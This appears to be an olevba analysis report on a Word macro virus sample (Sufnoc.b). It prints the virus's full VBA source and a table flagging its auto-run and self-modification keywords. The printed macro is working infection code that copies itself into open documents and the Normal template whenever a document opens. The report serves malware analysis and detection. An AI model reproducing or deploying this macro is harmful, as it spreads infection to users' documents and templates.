olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sufnoc.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sufnoc.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = Yes
Options.SaveNormalPrompt = Yes
Options.ConfirmConversions = Yes
For A = 1 To 3
If A = 1 Then Set B = ThisDocument Else If A = 2 Then Set B = ActiveDocument Else If A = 3 Then Set B = NormalTemplate
Set C = B.VBProject.VBComponents.Item(1).CodeModule
If A = 1 Then D = C.Lines(1, C.CountOfLines)
If A <> 1 Then C.DeleteLines 1, C.CountOfLines
If A <> 1 Then C.Addfromstring D
Next
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

